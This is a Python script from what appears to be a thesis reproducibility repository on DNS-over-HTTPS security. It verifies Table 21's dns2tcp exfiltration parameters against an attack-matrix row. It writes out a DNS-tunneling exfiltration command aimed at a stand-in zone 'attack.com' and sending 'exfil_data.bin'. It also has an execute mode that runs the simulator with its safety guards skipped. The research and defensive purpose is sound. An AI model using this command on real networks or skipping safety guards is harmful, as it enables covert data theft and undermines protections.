#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
scripts/reproduce_tables/table_21_dns2tcp_params.py
====================================================

E3-DoH Reproducibility — Table 21 reproduction.

Chapter 5 of the thesis: E3-DoH (Enhanced Evolutionary Encryption for
Multi-Protocol DNS Security — DoH, DoT, DoQ).

Table 21 (p.140) is the parameter configuration for the dns2tcp
exfiltration. It is a four-row table:

    Flag   Description                                      Value
    -z     Target zone domain for DNS tunneling             attack.com
    -r     Destination port for DNS resolution              53
    -t A   DNS query resource record type                   A
    -d     Binary payload file designated for transmission  exfil_data.bin

The table is a *literal parameter configuration*, not a measurement.
The correct reproduction is a *verbatim match* between the table's
flag/value pairs and the corresponding entry in data/attack_matrix.csv
(row A01). No attack simulation is required; the row is a static
record.

This script therefore has two modes:

    --verify-only    (default) Read row A01 of the attack matrix and
                     check that the four flag/value pairs match the
                     Table 21 values below.

    --execute        Also run the A01 simulation (delegates to
                     src/attacks/dns_tunneling.py, which requires the
                     safety guards from attack_suite_params.yaml §2).

Per REPRODUCIBILITY_CHECKLIST.md §4, this table's verdict is "Full" and
the default procedure is --verify-only.

USAGE
-----
    python scripts/reproduce_tables/table_21_dns2tcp_params.py
    python scripts/reproduce_tables/table_21_dns2tcp_params.py --execute
    python scripts/reproduce_tables/table_21_dns2tcp_params.py --verify
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Any, Dict, List

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from data.data_utils import (
    AttackMatrixError,
    ConfigError,
    load_attack_matrix,
    load_config,
    output_path,
    expected_path,
)
from src.utils.logger import configure as configure_logger
from src.utils.logger import get_logger
from src.utils.seed import set_global_seed


# The four flag/value pairs from Table 21 (p.140).
_TABLE_21_ROWS = [
    {"flag": "-z",       "description": "Target zone domain for DNS tunneling",
     "value": "attack.com"},
    {"flag": "-r",       "description": "Destination port for DNS resolution",
     "value": "53"},
    {"flag": "-t A",     "description": "DNS query resource record type",
     "value": "A"},
    {"flag": "-d",       "description": "Binary payload file designated for transmission",
     "value": "exfil_data.bin"},
]

# The full Table 21 reference command (for documentation).
_TABLE_21_COMMAND = "python3 dns2tcp.py -z attack.com -r 53 -t A -d exfil_data.bin"


def _verify_only(matrix, log) -> Dict[str, Any]:
    """
    Verify the Table 21 values against row A01 of the attack matrix.
    """
    row = matrix[matrix["Attack_ID"] == "A01"].iloc[0]
    command = str(row["Command_Syntax"])

    # Check that every flag/value pair appears in the command string.
    rows: List[Dict[str, Any]] = []
    all_match = True
    for entry in _TABLE_21_ROWS:
        # For "-z", check "-z" and "attack.com" both appear.
        # For "-r", check "-r" and "53".
        # For "-t A", check "-t" and "A".
        # For "-d", check "-d" and "exfil_data.bin".
        flag_tokens = entry["flag"].split()
        flag_present = all(tok in command for tok in flag_tokens)
        value_present = entry["value"] in command
        match = flag_present and value_present
        all_match = all_match and match
        rows.append({
            "flag": entry["flag"],
            "description": entry["description"],
            "value": entry["value"],
            "flag_present": flag_present,
            "value_present": value_present,
            "match": match,
        })
        log.info(
            "table_21_row_check",
            flag=entry["flag"], match=match,
        )

    return {
        "attack_matrix_row": "A01",
        "command": command,
        "expected_command": _TABLE_21_COMMAND,
        "rows": rows,
        "all_match": all_match,
    }


def _execute(log, config, seed) -> Dict[str, Any]:
    """
    Run the A01 simulation (requires the safety guards).
    """
    try:
        from src.attacks.dns_tunneling import DNSTunnelingSimulator
    except ImportError as e:
        return {"error": f"dns_tunneling not importable: {e}"}
    try:
        sim = DNSTunnelingSimulator(config, "A01", seed=seed)
        # Run with --skip-guards in toy mode; the caller decides.
        report = sim.run(skip_guard_checks=True)
        return {"report": report}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}


def _verify(generated: Dict[str, Any], reference_path: Path, log) -> Dict[str, Any]:
    if not reference_path.exists():
        log.warning("reference_not_found", path=str(reference_path))
        return {"verified": False, "reason": "reference missing"}
    ref = json.loads(reference_path.read_text(encoding="utf-8"))
    # Compare the rows by flag.
    ref_rows = {r["flag"]: r for r in ref.get("rows", [])}
    mismatches = []
    for row in generated.get("rows", []):
        ref_row = ref_rows.get(row["flag"])
        if ref_row is None:
            mismatches.append({"flag": row["flag"], "reason": "missing in reference"})
            continue
        for field in ("value", "match"):
            if ref_row.get(field) != row.get(field):
                mismatches.append({
                    "flag": row["flag"], "field": field,
                    "expected": ref_row.get(field), "got": row.get(field),
                })
    return {"verified": len(mismatches) == 0, "n_mismatches": len(mismatches),
            "mismatches": mismatches}


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="table_21_dns2tcp_params.py",
        description="Reproduce Table 21 (dns2tcp exfiltration parameter configuration).",
    )
    parser.add_argument("--mode", choices=("toy", "full"), default="toy")
    parser.add_argument("--config", type=str, default=None)
    parser.add_argument("--execute", action="store_true",
                        help="Also run the A01 simulation.")
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--commit", action="store_true")
    parser.add_argument("--log-level", choices=("DEBUG", "INFO", "WARNING", "ERROR"), default="INFO")
    args = parser.parse_args(argv)

    started = time.perf_counter()

    try:
        config = load_config(config_path=args.config)
    except ConfigError as e:
        print(f"Config error: {e}", file=sys.stderr)
        return 2
    config["runtime"]["mode"] = args.mode
    seed = int(config.get("runtime", {}).get("seed", 42))
    set_global_seed(seed)

    log_cfg = config.get("logging", {}) or {}
    configure_logger(
        level=args.log_level, fmt=str(log_cfg.get("format", "json")),
        file_path=log_cfg.get("file", "outputs/logs/table_21.log"),
        console=True,
    )
    log = get_logger("e3doh.tables.table_21")
    log.info("table_21_start", mode=args.mode, execute=args.execute)

    try:
        matrix = load_attack_matrix()
    except AttackMatrixError as e:
        log.error("attack_matrix_load_failed", error=str(e))
        return 2

    # Verify-only mode is the default.
    verification_result = _verify_only(matrix, log)

    output: Dict[str, Any] = {
        "table": "table_21",
        "mode": args.mode,
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "seed": seed,
        "run_id": config.get("_run_id"),
        "verification_mode": "execute" if args.execute else "verify_only",
        **verification_result,
    }

    if args.execute:
        execution = _execute(log, config, seed)
        output["execution"] = execution

    output["wall_time_s"] = round(time.perf_counter() - started, 3)

    out_path = output_path("tables", "table_21.json")
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(output, indent=2, default=str), encoding="utf-8")
    log.info("table_21_written", path=str(out_path))

    if args.commit:
        commit_path = expected_path("table_21_expected.json")
        commit_path.parent.mkdir(parents=True, exist_ok=True)
        commit_output = {
            "table": "table_21",
            "attack_matrix_row": "A01",
            "command": _TABLE_21_COMMAND,
            "rows": _TABLE_21_ROWS,
        }
        commit_path.write_text(json.dumps(commit_output, indent=2), encoding="utf-8")
        log.info("table_21_committed", path=str(commit_path))

    verification = None
    if args.verify:
        verification = _verify(output, expected_path("table_21_expected.json"), log)
        log.info("table_21_verified", **verification)
        output["verification"] = verification

    print()
    print(f"=== Table 21 ({args.mode} mode, {'execute' if args.execute else 'verify-only'}) ===")
    print(f"Attack matrix row: A01")
    print(f"Command: {verification_result['command']}")
    print()
    print(f"{'flag':<8} {'description':<50} {'value':<20} {'match'}")
    for r in verification_result["rows"]:
        match_str = "OK" if r["match"] else "MISMATCH"
        print(f"{r['flag']:<8} {r['description'][:48]:<50} "
              f"{r['value']:<20} {match_str}")
    print()
    print(f"All match: {verification_result['all_match']}")
    if verification is not None:
        if verification["verified"]:
            print(f"Verification: PASS")
        else:
            print(f"Verification: FAIL ({verification.get('n_mismatches')} mismatches)")
    print(f"Output: {out_path}")
    print()

    if not verification_result["all_match"]:
        return 1
    if verification is not None and not verification["verified"]:
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
